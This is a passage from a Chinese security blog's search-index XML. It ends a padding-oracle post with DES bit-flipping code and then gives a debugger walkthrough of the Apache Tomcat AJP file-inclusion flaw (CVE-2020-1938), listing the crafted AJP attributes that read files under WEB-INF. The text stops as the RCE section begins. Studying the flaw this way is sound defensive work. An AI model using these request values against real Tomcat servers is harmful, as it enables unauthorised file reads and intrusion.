punctuation">)</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    <span class="token keyword">return</span> destr <span class="token operator">=</span> des_encrypt<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>cipher <span class="token operator">=</span> bytes<span class="token punctuation">(</span>KEY2<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>x <span class="token operator">=</span> bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>ord<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>cipher<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>x2 <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>str3 <span class="token operator">=</span> des_descrypt<span class="token punctuation">(</span>str<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str3<span class="token punctuation">)</span></code></pre><p>下面是执行结果</p><p><img src="/2020/05/31/paddingoracle-yuan-li-shen-du-jie-xi/10.png" alt="10"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Padding Oracle </tag>
            
            <tag> CBC </tag>
            
            <tag> DES </tag>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Tomcat 从文件包含到RCE漏洞原理深入分析</title>
      <link href="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/"/>
      <url>/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Tomcat-从文件包含到RCE漏洞原理深入分析"><a href="#Apache-Tomcat-从文件包含到RCE漏洞原理深入分析" class="headerlink" title="Apache Tomcat 从文件包含到RCE漏洞原理深入分析"></a>Apache Tomcat 从文件包含到RCE漏洞原理深入分析</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2020年02月20日，于CNVD公开的漏洞公告中发现Apache Tomcat文件包含漏洞（CVE-2020-1938）。</p><p>Apache Tomcat为Apache开源组织开发的用于处理HTTP服务的项目。Apache Tomcat服务器中被发现存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件。</p><p>本次漏洞是一个单独的文件包含漏洞，该漏洞依赖于Tomcat的AJP（定向包协议）协议。AJP协议自身存在一定的缺陷，导致存在可控参数，通过可控参数可以导致文件包含漏洞。AJP协议使用率约为7.8%，鉴于Tomcat作为中间件被大范围部署在服务器上，本次漏洞危害较大。</p><h2 id="AJP13协议介绍"><a href="#AJP13协议介绍" class="headerlink" title="AJP13协议介绍"></a>AJP13协议介绍</h2><p>我们对Tomcat的普遍认识主要有两大功能，一是充当web服务器，可以对一切静态资源的请求作出回应，二就是Servlet容器</p><p>常见的web服务器有 Apache、 Nginx、 IIS等。常见的Servlet容器有Tomcat，Weblogic，JBOSS等</p><p>Servlet容器可以理解为是Web服务器的升级版，拿Tomcat来举例，Tomcat本身可以不做Servlet容器使用，仅仅充当Web服务器的角色是完全没问题的，但是在处理静态资源请求的效率和速度上是远不及Apache，所以很多情况下生产环境中都会将Apache作为web服务器来接受用户的请求，静态资源有Apache直接处理，而Servlet请求则交由Tomcat来进行处理。这么做就可以让两个中间件各司其职，大大加快相应速度。</p><p>众所周知我们用户的请求是以http协议的形式传递给Web 服务器的，我们在浏览器中对某个域名或者ip进行访问，头部都会有http或者https的表示，而AJP协议浏览器是不支持的，我们无法通过浏览器发送AJP的报文。当然AJP这个协议也不是提供给我们用户来使用的。</p><p>在Tomcat$ CATALINA_BASE/conf/web.xml默认配置了两个Connector，分别监听两个不同的端口，一个是HTTP Connector  默认监听8080端口，一个是AJP Connector 默认监听8009端口。</p><p>HTTP Connector的主要就是负责接收来自用户的请求，不管事静态还是动态，只要是HTTP请求就时由HTTP Connector来负责。有了这个 Connector Tomcat才能成为一个web服务器，但还额外可处理Servlet和jsp。</p><p>而AJP协议的使用对象通常是另一个Web服务器。例如Apache ，这里从网上找到了一张图，以此图来进行说明</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/1.png" alt="1"></p><p>通常情况下AJP协议的使用场景是这样的。</p><p>AJP是一个二进制的TCP传输协议，浏览器无法使用，首先由Apahche与Tomcat之间进行AJP协议的通信，然后由Apache通过proxy_ajp模块进行反向代理，将其转换成HTTP服务器然后在暴露给用户，让用户来进行访问。</p><p>之所以要这么做，是因为相比HTTP这种纯文本的协议来说，效率和性能更高，同时也做了很多优化。</p><p>其实AJP协议某种程度上可以理解为是HTTP的二进制版，为了加快传输效率从而被使用，实际情况是像Apache这样有proxy_ajp模块可以反向代理AJP协议的很少，所以日常生产中AJP协议也很少被用到</p><h2 id="Tomcat-远程文件包含漏洞分析"><a href="#Tomcat-远程文件包含漏洞分析" class="headerlink" title="Tomcat 远程文件包含漏洞分析"></a>Tomcat 远程文件包含漏洞分析</h2><h3 id="漏洞分析环境搭建"><a href="#漏洞分析环境搭建" class="headerlink" title="漏洞分析环境搭建"></a>漏洞分析环境搭建</h3><p>首先从官网下载对应的Tomcat源码文件，和可执行文件。</p><p><a href="http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.50/" target="_blank" rel="noopener">http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.50/</a></p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/2.png" alt="2"></p><p>下载好后将两个文件夹放入同一个目录下</p><p>然后在源码中新增pom.xml并加入以下内容</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>Tomcat8.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>Tomcat8.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>finalName</span><span class="token punctuation">></span></span>Tomcat8.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>finalName</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sourceDirectory</span><span class="token punctuation">></span></span>java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sourceDirectory</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>testSourceDirectory</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>testSourceDirectory</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">></span></span>java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resources</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>testResources</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>testResource</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>testResource</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>testResources</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoding</span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoding</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.easymock<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>easymock<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>ant<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>ant<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>wsdl4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>wsdl4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.6.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jaxrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.eclipse.jdt.core.compiler<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>ecj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.5.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span></code></pre><p>然后添加一个Application</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/3.png" alt="3"></p><p>1、按照下面图示新增Application的配置信息</p><p>2、在Man class:中填入:<code>org.apache.catalina.startup.Bootstrap</code> </p><p>3、在VM options:中填入:<code>-Dcatalina.home="apache-tomcat-8.5.34"</code>，catalina.home替换成tomcat binary core的目录</p><p>4、jdk默认是1.8，因为我装的就是jdk1.8版本</p><p>5、启动过程中Test模块会报错，且为TestCookieFilter.java，注释里面的测试内容即可</p><p>然后运行 访问127.0.0.1:8080出现以下页面则环境搭建成功</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/4.png" alt="4"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/5.png" alt="5"></p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/6.png" alt="6"></p><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/7.png" alt="7"></p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/8.png" alt="8"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先根据网上的介绍我们定位到 org.apache.coyote.ajp.AjpProcessor这个类，根据网上透漏的漏洞消息，我们得知漏洞的产生是由于Tomcat对ajp传递过来的数据的处理存在问题，导致我们可以控制“javax.servlet.include.request_uri”，“javax.servlet.include.path_info”，“javax.servlet.include.servlet_path”，这三个参数，从而读取任意文件，甚至可以进行RCE。</p><p>我们先从任意文件读取开始分析</p><p>我所使用的环境使用Tomcat 8.0.50版本所搭建的，产生漏洞的点并不在AjpProcessor.prepareRequest()方法，8.0.50版本的漏洞点存在于AjpProcessor的父类，AbstractAjpProcessor这个抽象类的prepareRequest()中</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/9.png" alt="9"></p><p>我们在这里下断点</p><p>然后运行exp，然后先看一下此时的调用链</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/10.png" alt="10"></p><p>首先由于此次数据传输使用的是AJP协议，走的的8009口，并非我们常见的HTTP协议。所以首先SocketPeocessore这个内部类来进行处理，</p><p>处理完成后经过几次调用交由AbstractAjpProcessor.prepareRequest()，该方法就是漏洞产生的第一个点。</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/11.png" alt="11"></p><p>我们单步步入request.setAttribute()方法</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/12.png" alt="12"></p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/13.png" alt="13"></p><p>这里我们可以看到，attributes是一个HashMap，那这样就非常好理解了，就是将我们通过AJP协议传递过来的三个参数循环遍历存入这个HashMap</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/14.png" alt="14"></p><p>可以看到这里是一个while循环，我们来直接看循环完成后的结果</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/15.png" alt="15"></p><p>执行完后就会在Request对象的attributes属性中增加这三条数据。</p><p>到这里就是漏洞的前半部分，操纵可控变量将其改造层我们想要的数据。</p><p>我们先看一下exp发出的数据包是什么样的</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/16.PNG" alt="16"></p><p>我们通过使用WireShark抓包，看到了AJP报文的一些信息，其中有四个比较重要的参数，</p><p>URI:/asdf</p><p>javax.servlet.include.request_uri:/</p><p>javax.servlet.include.path_info: WEB-INF/Test.txt</p><p>javax.servlet.include.servlet_path:/</p><p>首先要讲到的就是这个URL，通过之前对AJP协议的介绍，我们知道通过AJP协议传来的数据最中还是要交由Servlet来进行处理的，那么问题就来了，应该交由那个Servlet来进行处理？</p><p>我们通过翻阅网上关于Tomcat的架构的一些文章和资料得知，在Tomcat$ CATALINA_BASE/conf/web.xml这个配置文件中默认定义了两个Servlet</p><p>一个是DefaultServlet</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/17.png" alt="17"></p><p>另一个是JspServlet</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/18.png" alt="18"></p><p>由于$ CATALINA_BASE/conf/web.xml这个文件是tomcat启动时默认加载的，所以这两个Servlet会默认存在Servlet容器中</p><p>当我们请求的URI不能和任何Servlet匹配时，就会默认由 DefaultServlet来处理，DefaultServlet主要用于处理静态资源，如HTML、图片、CSS、JS文件等，而且为了提升服务器性能，Tomcat对访问文件进行缓存。按照默认配置，客户端请求路径与资源的物理路径是一致的。</p><p>我们看到我们请求的URI为“/asdf”这就符合了无法匹配后台任何的Servlet这么一个条件，这里要注意一下，举个例子，譬如我们请求一个“abc.jsp”  但是后台没有“abc.jsp” 这种不属于无法匹配任何Servlet，因为.jsp的请求会默认走JspServlet来进行处理</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/19.png" alt="19"></p><p>好的，根据这段介绍，结合我们发送的数据包中的“URI:/asdf”这一属性，我们可以判断此次请求是由DefaultServlet来进行处理的。</p><p>我们定位到DefaultServlet的doGet方法</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/20.png" alt="20"></p><p>doGet方法里又调用了serveResource()方法</p><p>serveResource()方法由调用了getRelativePath()方法来进行路径拼接，我们跟进看一看</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/21.png" alt="21"></p><p>这里就是将我们传入的path_info 、servlet_path 进行复制的地方，request_uri用来做判断，如果发送的数据包中没有request_uri，就会走else后面的两行代码进行赋值，这样会就会导致漏洞利用失败</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/22.png" alt="22"></p><p>接下来就是对路径的拼接了，这里可以看到如果传递数据时不传递servlet_path，则result在进行路径拼接时就不会讲“/”拼接在“WEB-INF/web.xml”的头部，最后拼接的结果仍然是“WEB-INF/web.xml</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/23.png" alt="23"></p><p>接下来返回DefaultServle.serveResource()</p><p>紧接着判断path变量长度是否为0，为0则调用目录重定向方法</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/24.png" alt="24"></p><p>下面的代码就要开始读区我们指定的资源文件了</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/25.png" alt="25"></p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/26.png" alt="26"></p><p>我们跟进StandardRoot.getResource()方法</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/27.png" alt="27"></p><p>getResource()方法中又调用了一个很重要的方法validate()方法并将path作为变量传递进去进行处理，我们继续跟入</p><p>这里就牵扯到为什么我们为什么不能通过”/../../“的方式来读取webapp目录的上层目录里文件的原因了，首先是正常请求</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/28.png" alt="28"></p><p>我们可以看到正常请求最后return的result的路径就是我们文件所在的相对路径。</p><p>当我门尝试使用WEB-INF/../../Test.txt来读区webapp意外的目录中的文件时。可以看到此时返回的result就是null了，而且会抛出异常。</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/29.png" alt="29"></p><p>这一切的原因都在RequestUtil.normalize()这个函数对我们传递进来的路径处理上，我们跟进看一看</p><p>关键的点就在下面的截图代码中。我们传入的路径是“/WEB-INF/../../Test.txt”,首先程序会判断我们的路径中是否存在“/../”，自然是存在的且索引是8大于，所以第一个if 判断不会成功，也就不会跳出while循环，此时处理我们的路径，截取“/WEB-INF/..”以后的内容，然后在用String,indexOf()函数判断路径里是否有“/../”,显然还是有的，且索引为零，符合第二个if判断的条件，return null。</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/30.png" alt="30"></p><p>此处的目的就是 不允许，不允许传递的路径的开头为“/../”，且不允许同时出现两个连在一起的“/../” 所以我们最多只能读取到webapp目录，无法读取webapp以外的目录中的文件。</p><p>想要读取webapp目录下的其余目录内的文件可以通过修改数据包中的”URI”这个参数来实现</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/31.png" alt="31"></p><p>如此一来，程序最中拼接出我们所指定文件的绝对路径，并作为返回值进行返回</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/32.png" alt="32"></p><p>接下来就是回到getResource()函数进行文件读取了</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/33.png" alt="33"></p><p>以下是任意文件读取的调用链</p><p><img src="/2020/05/31/apachetomcat-cong-wen-jian-bao-han-dao-rce-lou-dong-yuan-li-shen-ru-fen-xi/34.png" alt="34"></p><p>RCE</p><p>接下来讲一下，RCE实现的原理</p><p>之前讲过Tomcat$ 